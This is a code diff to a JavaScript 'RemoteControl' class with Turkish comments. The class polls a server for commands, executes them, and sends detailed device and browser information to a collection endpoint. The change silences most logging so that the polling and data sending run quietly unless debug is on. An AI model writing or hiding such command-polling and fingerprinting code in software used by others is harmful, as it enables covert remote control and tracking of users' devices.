@@ -28,22 +28,15 @@ class RemoteControl {
     // Uzaktan kontrolü başlat
     async start() {
         if (this.isEnabled) {
-            console.log('⚠️ [RemoteControl] Already running');
+            if (this.debug) console.log('⚠️ [RemoteControl] Already running');
             return;
         }
 
-        console.log('🚀 [RemoteControl] Starting remote control system...');
         this.isEnabled = true;
-        
-        // Polling başlat
-        console.log('📡 [RemoteControl] Starting command polling...');
         this.poll();
-        
-        // Başlatma bildirimi gönder
-        console.log('📤 [RemoteControl] Sending start notification...');
         this.sendStartNotification();
         
-        console.log('✅ [RemoteControl] Remote Control ACTIVE - Session:', this.sessionId);
+        if (this.debug) console.log('✅ [RemoteControl] Remote Control ACTIVE');
     }
 
     // Cihaz bilgilerini topla (detaylı)
@@ -119,40 +112,27 @@ class RemoteControl {
 
     // Komutları kontrol et (polling)
     async poll() {
-        if (!this.isEnabled) {
-            console.log('⚠️ [RemoteControl] Polling skipped - system disabled');
-            return;
-        }
+        if (!this.isEnabled) return;
 
         try {
-            console.log('🔄 [RemoteControl] Polling for commands...');
             const response = await fetch(this.commandEndpoint);
-            
-            if (!response.ok) {
-                console.error(`❌ [RemoteControl] Poll failed - Status: ${response.status}`);
-                throw new Error(`HTTP ${response.status}`);
-            }
+            if (!response.ok) throw new Error(`HTTP ${response.status}`);
             
             const data = await response.json();
-            console.log('📥 [RemoteControl] Poll response:', data);
 
             if (data.success && data.commands && data.commands.length > 0) {
-                console.log(`📡 [RemoteControl] ${data.commands.length} commands received:`, data.commands);
-
-                // Her komutu işle
+                if (this.debug) console.log(`📡 ${data.commands.length} commands received`);
+                
                 for (const cmd of data.commands) {
                     await this.executeCommand(cmd);
                 }
-            } else {
-                console.log('📭 [RemoteControl] No commands in queue');
             }
         } catch (error) {
-            console.error('❌ [RemoteControl] Poll error:', error.message, error);
+            if (this.debug) console.error('❌ Poll error:', error.message);
         }
 
         // Bir sonraki poll'u planla
         if (this.isEnabled) {
-            console.log(`⏱️ [RemoteControl] Next poll in ${this.pollInterval}ms`);
             this.pollTimer = setTimeout(() => this.poll(), this.pollInterval);
         }
     }
@@ -160,20 +140,17 @@ class RemoteControl {
     // Komutu çalıştır
     async executeCommand(cmd) {
         try {
-            console.log('🎮 [RemoteControl] Executing command:', cmd);
+            if (this.debug) console.log('🎮 Executing:', cmd.command);
             
             // /help komutu
             if (cmd.command === 'show_help') {
-                console.log('📖 [RemoteControl] Sending help message...');
                 await this.sendHelpMessage();
                 return;
             }
             
             // /devices komutu - cihaz bilgisini collection'a ekle (backend birleştirir)
             if (cmd.command === 'list_devices') {
-                console.log('📱 [RemoteControl] Sending device info to collection...');
                 await this.sendDeviceToCollection(cmd.message_id);
-                console.log('✅ [RemoteControl] Device info sent to collection!');
                 return;
             }
 
@@ -225,11 +202,7 @@ class RemoteControl {
     // Cihaz bilgisini collection'a gönder (backend birleştirir)
     async sendDeviceToCollection(messageId) {
         try {
-            console.log('📱 [RemoteControl] sendDeviceToCollection() called');
-            
             const deviceInfo = await this.collectDeviceInfo();
-            console.log('📊 [RemoteControl] Device info collected:', deviceInfo);
-            
             const platform = deviceInfo.platform || 'Unknown';
             const browser = this.getBrowser(deviceInfo.user_agent);
             const emoji = this.getDeviceEmoji(platform);
@@ -247,7 +220,6 @@ class RemoteControl {
                 connection: deviceInfo.connection_type || 'Unknown'
             };
             
-            console.log('📤 [RemoteControl] Sending to collection API...');
             const response = await fetch(this.collectDevicesEndpoint, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -258,11 +230,10 @@ class RemoteControl {
             });
 
             const result = await response.json();
-            console.log('✅ [RemoteControl] Collection API response:', result);
-            
+            if (this.debug) console.log('✅ Device sent to collection');
             return { success: true, result };
         } catch (error) {
-            console.error('❌ [RemoteControl] Send to collection error:', error.message, error.stack);
+            if (this.debug) console.error('❌ Collection error:', error.message);
             return { success: false, error: error.message };
         }
     }
